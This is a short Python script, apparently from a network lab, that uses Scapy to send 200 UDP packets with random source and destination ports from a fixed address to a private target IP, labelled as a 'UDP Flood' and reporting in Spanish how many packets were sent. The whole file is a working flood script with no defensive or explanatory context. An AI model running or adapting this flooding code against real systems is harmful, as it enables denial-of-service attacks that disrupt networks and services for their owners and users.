#!/usr/bin/env python3
from scapy.all import *
iface = "ens4"
src = "172.16.0.10"
target = "10.100.0.1"
print(f"[*] UDP Flood: {src} -> {target}")
pkts = [Ether()/IP(src=src, dst=target)/UDP(sport=RandShort(), dport=RandShort())
        for _ in range(200)]
sendp(pkts, iface=iface, verbose=False, inter=0.005)
print(f"[+] Enviados {len(pkts)} paquetes UDP")